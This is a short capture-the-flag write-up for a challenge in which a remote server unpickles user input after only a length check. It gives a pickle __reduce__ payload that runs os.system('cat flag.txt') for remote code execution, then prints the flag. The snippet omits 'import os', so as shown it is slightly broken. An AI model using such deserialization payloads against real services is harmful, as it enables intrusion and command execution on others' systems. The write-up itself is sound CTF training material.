# pickle games 1

## Description:

> Tags: easy

> Ever heard of the pickle games, they're very tasty!
Can you get RCE on the remote server?

> Author : chenx3n

> ncat -v --ssl pickle-games-1.challs.shellmates.club 443

> Files : [challenge.py](challenge.py)

## First thoughts:

The challenge is a Python Jail challenge, and from it's name, we know that's using `pickle` to evaluate our input.

## Reading the script:

Reading the script, we found that the input is passed to a `check` function, and it's only checking for thr length of the pickle. So a simple `pickle dump` with `__reduce__` method should solve the challenge.

## Solving the challenge:

I created the pickle with the following code:

```py
import pickle

class GetFlag():
    def __reduce__(self):
        command = ('cat flag.txt')
        return os.system, (command,)

pickled = pickle.dumps(GetFlag())
print(pickled.hex())
```

and the flag is:

```
shellmates{lEt_thE_piCkl3_gaMeS_BegiN!}
```